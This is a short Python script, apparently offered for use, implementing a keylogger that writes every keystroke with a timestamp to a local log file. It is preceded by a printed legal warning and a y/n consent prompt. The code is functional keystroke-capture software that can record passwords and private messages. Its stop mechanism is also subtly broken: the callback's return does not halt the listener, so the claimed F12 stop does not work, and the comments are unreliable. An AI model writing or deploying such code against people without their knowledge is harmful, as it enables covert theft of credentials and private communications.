import keyboard
import time
from datetime import datetime

def keylogger(log_file="keystrokes.log", stop_key="esc"):
    """
    Records keystrokes until the stop key is pressed
    Logs keys along with timestamps
    """
    print(f"[*] Starting keylogger. Press '{stop_key}' to stop.")
    
    # Create log file header
    with open(log_file, "a") as f:
        f.write(f"\n\n{'='*50}\n")
        f.write(f"Keylogger Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Stop Key: {stop_key.upper()}\n")
        f.write("="*50 + "\n\n")
    
    # Key press callback function
    def on_key_press(event):
        key = event.name
        
        # Handle special keys
        if len(key) > 1:
            key = f"[{key.upper()}]"
        
        # Write to log file
        with open(log_file, "a") as f:
            timestamp = datetime.now().strftime("%H:%M:%S")
            f.write(f"{timestamp} - {key}\n")
        
        # Check for stop key
        if key.lower() == f"[{stop_key}]":
            print("\n[*] Stop key detected. Terminating keylogger.")
            return False  # This stops the listener
    
    # Setup keyboard listener
    keyboard.on_press(on_key_press)
    
    # Keep the program running
    keyboard.wait()

if __name__ == "__main__":
    # Ethical confirmation
    print("KEYLOGGER WARNING:")
    print("1. This program records all keyboard input")
    print("2. Use only with EXPLICIT PERMISSION")
    print("3. Unauthorized use may be ILLEGAL")
    
    if input("\nDo you understand and agree to use this ethically? (y/n): ").lower() == "y":
        print("\nKeylogger starting in 5 seconds...")
        time.sleep(5)
        keylogger(stop_key="f12")  # F12 is the stop key
    else:
        print("Keylogger activation canceled.")
        